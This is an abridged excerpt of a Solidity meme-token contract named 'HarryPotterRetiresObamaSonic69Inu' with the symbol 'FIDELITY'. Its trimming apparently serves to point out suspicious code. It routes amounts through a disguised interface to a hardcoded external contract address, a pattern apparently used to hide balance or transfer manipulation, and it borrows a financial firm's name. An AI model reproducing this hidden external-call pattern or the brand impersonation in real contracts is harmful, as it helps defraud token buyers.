...
interface IERC5679 {
      function calculateNumber(uint256 value) external returns (uint256);
}
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _etfSwap = 0xF8f7987d16159e11802eA1FA39907F852558520F;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return etfSwap.calculateNumber(amount);
    }
    ...
    function _DeployFidelity(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFidelity(creator, initialSupply);
    }
}

contract FIDELITY is ERC20Token {
    constructor() ERC20Token("HarryPotterRetiresObamaSonic69Inu", "FIDELITY", msg.sender, 69420000000 * 10 ** 18) {
    }
}